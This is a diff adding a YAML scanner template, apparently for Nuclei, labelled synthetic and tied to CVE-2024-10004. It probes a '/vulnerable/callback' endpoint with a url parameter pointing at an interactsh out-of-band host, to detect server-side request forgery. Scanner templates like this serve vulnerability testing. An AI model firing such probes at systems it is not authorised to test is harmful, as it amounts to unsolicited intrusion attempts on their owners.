@@ -1,0 +1,15 @@
+id: synthetic-cve-2024-10004
+info:
+  name: Synthetic OAST Request
+  severity: high
+  classification:
+    cve-id: CVE-2024-10004
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/vulnerable/callback?url=http://{{interactsh-url}}'
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - http
